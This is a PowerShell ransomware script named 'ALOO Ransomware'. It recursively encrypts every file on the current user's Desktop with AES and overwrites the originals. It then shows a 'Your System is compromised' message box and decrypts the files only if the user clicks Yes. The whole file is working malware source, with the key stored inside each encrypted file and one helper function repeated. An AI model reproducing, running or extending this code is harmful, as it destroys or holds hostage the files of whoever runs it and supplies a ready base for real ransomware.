function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}
function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}
function Encrypt-String($key, $bytes) {
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $bytesKey = [System.Convert]::FromBase64String($key) 
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $bytesKey + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Decrypt-String($encryptedBytes) {
    $bytes = $encryptedBytes
    $IV = $bytes[0..15]
    $bytesKey = $bytes[16..47]
    $key = [System.Convert]::ToBase64String($bytesKey)
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 48, $bytes.Length - 48);
    $aesManaged.Dispose()
    $unencryptedData
}


$username = $env:UserName
$fileDirectory = 'C:\Users\' + $username + '\Desktop'

$files = Get-ChildItem $fileDirectory -Recurse
ForEach($file in $files){
    $filePath = $file.FullName
    $key = Create-AesKey
    $unencryptedBytes = [System.IO.File]::ReadAllBytes($filePath)
    $encryptedString = Encrypt-String $key $unencryptedBytes
    $encryptedBytes = [System.Convert]::FromBase64String($encryptedString)
    [System.IO.File]::WriteAllBytes($filePath,$encryptedBytes)
}

Add-Type -AssemblyName PresentationCore,PresentationFramework
$ButtonType = [System.Windows.MessageBoxButton]::YesNoCancel
$MessageIcon = [System.Windows.MessageBoxImage]::Error
$MessageBody = "Congrats Your System is compromised.."
$MessageTitle = "ALOO Ransomware"
 
$Result = [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)
 
if($Result -eq "Yes"){
    $username = $env:UserName
    $fileDirectory = 'C:\Users\' + $username + '\Desktop'
    $files = Get-ChildItem $fileDirectory -Recurse
    ForEach($file in $files){
        $filePath = $file.FullName
        $encryptedBytes = [System.IO.File]::ReadAllBytes($filePath)
        $unencryptedBytes = Decrypt-String $encryptedBytes
        [System.IO.File]::WriteAllBytes($filePath,$unencryptedBytes)
    }   

    $ButtonType = [System.Windows.MessageBoxButton]::OK
    $MessageIcon = [System.Windows.MessageBoxImage]::Information
    $MessageBody = "Files Restored Successfully!!"
    $MessageTitle = "ALOO Ransomware"
     
    [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)

}